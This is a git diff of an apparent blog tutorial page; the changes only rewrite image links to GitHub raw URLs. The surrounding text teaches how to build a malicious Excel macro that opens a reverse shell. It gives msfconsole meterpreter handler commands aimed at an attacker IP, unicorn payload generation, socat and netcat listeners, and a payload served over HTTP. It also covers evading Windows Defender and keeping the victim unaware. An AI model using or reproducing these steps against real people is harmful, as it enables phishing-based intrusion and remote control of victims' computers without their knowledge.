@@ -16,7 +16,7 @@ const newPost = {
     </code></pre></div>
     
     <p><br>It will generate something like this, Save it we will use it later</p>
-    <figure><img src="../photos/1.png" alt=""><figcaption><p><strong><li>How to Excel</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/1.png" alt=""><figcaption><p><strong><li>How to Excel</strong></p></figcaption></figure>
     
     <p>Then go to the Windows machine, I prefer to use Windows 10 for this task,</p>
     <ul>
@@ -25,12 +25,12 @@ const newPost = {
     <li>Go to the “view” tab</li>
     <li>Click on macros and select its sub-menu option “view macros“.</li>
     </ul>
-    <figure><img src="../photos/2.png" alt=""><figcaption><p><strong><li>Create_Bad_Macro</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/2.png" alt=""><figcaption><p><strong><li>Create_Bad_Macro</strong></p></figcaption></figure>
     
     <ul>
     <li>Then type your macro file name and click create</li>
     </ul>
-    <figure><img src="../photos/3.png" alt=""><figcaption><p><strong><li>Paste_Me</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/3.png" alt=""><figcaption><p><strong><li>Paste_Me</strong></p></figcaption></figure>
 
     </ul>
     
@@ -38,11 +38,11 @@ const newPost = {
     <li>Remember the payload from the first, Go and copy it and paste it into the code Block</li>
     </ul>
     <figure>
-    <figure><img src="../photos/4.png" alt=""><figcaption><p><strong><li>Save_Me</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/4.png" alt=""><figcaption><p><strong><li>Save_Me</strong></p></figcaption></figure>
     <ul>
 
     <p><li>Save the file as &quot; </strong><mark style="color:yellow;">Excel Macro-Enabled Workbook</mark>&quot;  type</p>
-    <figure><img src="../photos/5.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/5.png" alt=""><figcaption></figcaption></figure>
     </ul>
 
     <p><li>Last but not least we need to set our handler to establish the connection, From your Attacker machine</p>
@@ -51,15 +51,15 @@ const newPost = {
     ┌──(root㉿N1NJ10)-[~]
     └─# msfconsole -q -x " use exploit/multi/handler; <span class="hljs-built_in">set</span> -g PAYLOAD windows/x64/meterpreter/reverse_https;<span class="hljs-built_in">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-built_in">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ; run"
     </code></pre></div>
-    <figure><img src="../photos/6.png" alt=""><figcaption><p><strong><li>Enable_Macro</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/6.png" alt=""><figcaption><p><strong><li>Enable_Macro</strong></p></figcaption></figure>
     <ul>
     <li>Now, we are good to start our POC, Go to your Windows machine and open our file Then click on the “<mark style="color:yellow;">Enable Content</mark>” button</li>
     </ul>
-    <figure><img src="../photos/7.png" alt=""><figcaption><p><strong><li>Fail</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/7.png" alt=""><figcaption><p><strong><li>Fail</strong></p></figcaption></figure>
     
     <p>Then go to your Meterpreter, Pingo The Windows Defender blocks the script and block the file also&#x20;</p>
     <p>&#x20;</p>
-    <figure><img src="../photos/8.png" alt=""><figcaption><p><strong>Peter Kim</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/8.png" alt=""><figcaption><p><strong>Peter Kim</strong></p></figcaption></figure>
     
     <p><strong>Despite of we encoded our payload with the shikata_ga_nai encoder the Defender detected us, So we aren&#39;t script kiddies As Peter Kim said in Playbook2 &quot;</strong><mark style="color:yellow;"><strong>My feelings on Anti-Virus (AV) scanners are that they are there to stop the script kiddies or old malware</strong></mark><strong>&quot;</strong></p>
     <p>So I tried many ways to achieve this, and here are some ways that I can bypass the Defender and the Firewall</strong>&#x20;</p>
@@ -80,13 +80,13 @@ const newPost = {
     └─# <span class="hljs-keyword">python3</span> unicorn.<span class="hljs-keyword">py</span> windows/meterpreter/reverse_https <span class="hljs-symbol">&lt;ATTACKER_IP&gt;</span> <span class="hljs-symbol">&lt;ATTACKER_PORT&gt;</span>  macro
     
     </pre><p> <p style="color:Yellow;"><strong>Note:</p>x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload</strong>.</p>
-    <figure><img src="../photos/9.png" alt=""><figcaption><p><strong>Then</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/9.png" alt=""><figcaption><p><strong>Then</strong></p></figcaption></figure>
     
     <p><li>Go to your Windows machine and repeat the steps we did before opening Excel ..... , execpt copy our payload from the Powershell_attack.txt file that unicorn generate</p>
-    <figure><img src="../photos/10.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/10.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     
     <p><li>Then save the file</p>
-    <figure><img src="../photos/11.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/11.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     
     <p>We need to set our listener now , from the attacker machine&#x20;</p>
     <div class="script-container"><h4>Attacker</h4>
@@ -96,17 +96,17 @@ const newPost = {
     └─# msfconsole -q -x " <span class="hljs-keyword">use</span> exploit/multi/<span class="hljs-keyword">handler</span>; <span class="hljs-keyword">set</span> -g PAYLOAD windows/meterpreter/reverse_https;<span class="hljs-keyword">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-keyword">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ;<span class="hljs-keyword">set</span> AutoRunScript <span class="hljs-string">'migrate -n explorer.exe'</span>;<span class="hljs-keyword">set</span> EXITONSESSION <span class="hljs-literal">false</span>; <span class="hljs-keyword">set</span> EXITFUNC <span class="hljs-keyword">thread</span>; run"
     </code></pre>
     <ul>
-    <figure><img src="../photos/12.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/12.png" alt=""><figcaption></figcaption></figure>
     </ul>
 
     <p>Now we are good to establish the attack, Go to your windows and launch the Excel file&#x20;</p>
-    <figure><img src="../photos/13.png" alt=""><figcaption><p></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/13.png" alt=""><figcaption><p></p></figcaption></figure>
     
     <p>Click on &quot; Enable Content &quot;, and you should see this error message</p>
-    <figure><img src="../photos/14.png" alt=""><figcaption><p></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/14.png" alt=""><figcaption><p></p></figcaption></figure>
     
     <p>Then go to your Attacker machine, you should see that</p>
-    <figure><img src="../photos/15.png" alt=""><figcaption><p><strong>Pingo 🥳</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/15.png" alt=""><figcaption><p><strong>Pingo 🥳</strong></p></figcaption></figure>
     
     <p>But this method may the user to call his supervisor and tell him about this problem or he may guess this is a suspicious file so <mark style="color:yellow;">we fail again.</mark></p>
     <ul>
@@ -199,19 +199,19 @@ const newPost = {
     <p>Write blabla in empty columns</strong>&#x20;</p>
     <li>Go to the “view” tab</p>
     <li>Click on macros and select its sub-menu option “view macros“.</strong></li>
-    <figure><img src="../photos/16.png" alt=""><figcaption><p></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/16.png" alt=""><figcaption><p></p></figcaption></figure>
     
     <ul>
     <li>Then type your macro file name and click create</li>
     <li>Copy our VBA script after add your IP and port  Then paste it into the code Block</li>
     </ul>
 
-    <figure><img src="../photos/17.png" alt=""><figcaption><p></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/17.png" alt=""><figcaption><p></p></figcaption></figure>
     
     <ul>
     <li>Save the file as &quot; <mark style="color:yellow;">Excel Macro-Enabled Workbook</strong></mark> &quot; type</li>
     </ul>
-    <figure><img src="../photos/18.png" alt=""><figcaption><p></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/18.png" alt=""><figcaption><p></p></figcaption></figure>
     
     <ul>
     <li>Now go to the Attacker machine and save our payload file in a file called &quot;rev.ps1&quot;</li>
@@ -231,7 +231,7 @@ const newPost = {
     </code></pre>
     <ul>
     
-    <figure><img src="../photos/19.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/19.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     </ul>
 
     <ul>
@@ -242,12 +242,12 @@ const newPost = {
     └─# <span class="hljs-selector-tag">socat</span> <span class="hljs-selector-tag">TCP4-LISTEN</span><span class="hljs-selector-pseudo">:1234</span>,<span class="hljs-selector-tag">fork</span> <span class="hljs-selector-tag">STDOUT</span>
     </code></pre>
     </ul>
-    <figure><img src="../photos/20.png" alt=""><figcaption><p></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/20.png" alt=""><figcaption><p></p></figcaption></figure>
     
     <p>You can use &quot; rlwrap nc -nlvp 1234 &quot; for netcat&#x20;</p>
 
     <p>Before we start, look at my C: dir</p>
-    <figure><img src="../photos/21.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/21.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     
     <p>There is no dir called Temp here, It is just for POC</p>
     <ul>
@@ -255,30 +255,30 @@ const newPost = {
     </ul>
     <p>Go to your Windows machine and open our file Then click on the “<mark style="color:yellow;">Enable Content</mark>” button</p>
     
-    <figure><img src="../photos/22.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/22.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     
     <p>once you click you will notice no nothing malicious happened, but that&#39;s the point of being stealthy cuz we are the guys who know what should happen We will see in particular places<</p>
     <ul>
 
     <li>First, you will notice that there is a temp dir just created and it contains a file called rev.ps1 that&#39;s our reverse shell, the user will notice nothing the Excel will not exit or something not normal will happen like before</li>
     </ul>
-    <figure><img src="../photos/23.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/23.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     
     <ul>
     <li>Now go to your Attacker machine you will notice that the Python HTTP server send a file called rev.ps1 which is our payload</li>
     </ul>
-    <figure><img src="../photos/24.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/24.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
     
     <ul>
     <li>Go to the tab you open the Socat listener to check</li>
     </ul>
 
-    <figure><img src="../photos/25.png" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/25.png" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
     
     <ul>
     <li>Pingo, We got the shell with no warnings&#x20;</li>
     </ul>
-    <figure><img src="../photos/26.jpg" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
+    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/26.jpg" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
     
     <p>That&#39;s it, my friend, I&#39;m happy to share with you more of my articles and tips\&amp;tricks If you want just Subscribe to our Telegram channel :</strong>&#x20;</p>
     <a href="https://t.me/N1NJ10" data-rnwi-u529wo-aq1qub-c1zw6o-1k4bu33-1cut0bx-na6qhi--hover="true" data-rnwi--1tgwseu--focus="true" data-rnwi-5xr8s6-dse9kg-1rbj2e8-2fw26j-focus-visible="true" data-rnwi-handle="BaseCard" class="base-card" r-lrvibr r-1loqt21 r-1otgn73 r-m2nopt r-z2wwpe r-rs99b7 r-1udh08x r-1clhhh9 r-18u37iz r-1awozwy r-nsbfu8" ><div class="image-icon"><img alt="" src="https://cdn4.telegram-cdn.org/file/MlS1IzvCXydqvFSIu6454raNgj2Fmi1dicjQHNsOy8c4DvkqGPwSxU92hIku3jl9nJgG3NXlzzHM-umAGKaNWj37PSXnQzYm43C7HQfbzhb2x_qd8Mh2R6itnT99dR75W7er_lan6AZsZOIrfG7UqK3n5G_L3XRBBo6BPy60v7z5zLi_OLgk4_k9K5xsSekxVMuP2u98c6WE5yQdNqZ06M7DF2oxcTNuJ5QqbLgAETPzJLl1LTm6VsiMZKqTRW0HcIbeAvgDaDh-uemooB4HA-PpduSAM0Rxz-y83VBlELmlCbuM2FOh1KpIvvJFUCrGsxLhVOYvlUXyUdeVd2Fckw.jpg" width="100%" height="auto" decoding="async" data-rnwibasecard--6b6lzv-hover="true" data-rnwi-handle="nearest" class="r-hd655f" style="width: 32px; height: 32px; border-radius: 4px;"></div><div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2"><div class="css-175oi2r r-18u37iz r-1awozwy"><div dir="auto" data-rnwibasecard--6b6lzv-hover-focus="true" data-rnwi-handle="nearest" class="css-1rynq56 r-dnmrzs r-1udh08x r-1udbk01 r-3s2u2q r-1iln25a r-gg6oyi r-ubezar r-135wba7 r-majxgm r-z9jf92" title="Penetration Testing with Shellcode: Detect, exploit, and secure network-level and operating system vulnerabilities">N1NJ10 Channel</div></div><div class="css-175oi2r"><div dir="auto" class="css-1rynq56 r-gg6oyi r-1b43r93 r-16dba41 r-hbpseb r-1f2v84d">https://t.me/</div></div></div></a>
